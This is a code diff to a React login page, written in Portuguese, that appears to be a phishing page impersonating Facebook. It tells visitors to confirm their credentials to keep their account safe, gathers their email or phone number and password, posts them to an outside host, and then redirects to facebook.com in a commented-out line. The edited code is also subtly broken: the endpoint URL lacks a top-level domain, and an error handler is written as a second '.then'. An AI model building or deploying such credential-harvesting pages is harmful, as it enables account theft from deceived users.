@@ -9,16 +9,11 @@ function App(){
             pass: formData.get('pass')
         }
 
-        fetch("https://api.utocria.com/api/submit", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(data)
-        })
-        .then((response) => response.json())
-        .then((data) => console.log("Success:", data))
-        .catch((error) => console.error("Error:", error));
+        axios.post("https://api.utocria/api/submit", data)
+            .then((response) => console.log(response.data))
+            .then((error) => console.log(error));
+        
+            //window.location.replace("http://facebook.com");
     }
 
     var inputClass = 'border border-form-border rounded-md h-10 w-64 lg:w-full px-2 hover:border-blue active:border-blue focus:border-blue focus:outline-none focus:ring focus:ring-blueRing';
@@ -31,7 +26,7 @@ function App(){
                 <p className=" lg:text-start text-center px-8 lg:text-2xl text-xl font-medium text-fontColor">Confirme as suas credencias para manter a sua conta segura.</p>
             </div>
             <div className="lg:basis-1/3 w-4/5 lg:w-auto bg-white rounded-md p-4 drop-shadow-lg">
-                <form action="/submit" method="POST" className="flex flex-col gap-2 items-center">
+                <form action={sendData} method="POST" className="flex flex-col gap-2 items-center">
                     <div className="m-2 w-96 text-center">
                         <input type="text" name="email" id="email" className={inputClass} placeholder="E-mail ou Número de Telemóvel" />
                     </div>
